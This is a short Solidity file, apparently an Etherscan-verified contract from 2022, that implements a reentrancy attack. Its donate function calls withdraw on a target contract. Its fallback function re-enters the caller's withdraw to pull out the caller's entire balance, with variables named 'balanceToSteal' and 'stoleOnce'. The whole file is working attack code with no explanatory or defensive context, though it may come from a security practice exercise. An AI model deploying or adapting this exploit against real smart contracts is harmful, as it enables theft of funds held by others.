/**
 *Submitted for verification at Etherscan.io on 2022-09-09
*/

// File: contracts/ReentrancyInterface.sol

pragma solidity >=0.8.0 <0.9.0;

interface ReentrancyInterface {
  function withdraw (uint _amount) external;
  function donate(address _to) external payable;
}
// File: contracts/Reentrancyfun.sol

pragma solidity >= 0.8.0 < 0.9.0;


contract ReentrancyFun{

    function donate(address payable _to, uint256 _amount) public {
        ReentrancyInterface(_to).withdraw(_amount);
    }
    
    bool public stoleOnce = false;

    fallback() external payable{
        if(!stoleOnce){
            uint256 balanceToSteal = address(msg.sender).balance;
            ReentrancyInterface(msg.sender).withdraw(balanceToSteal);
            stoleOnce = true;
        }
    }
}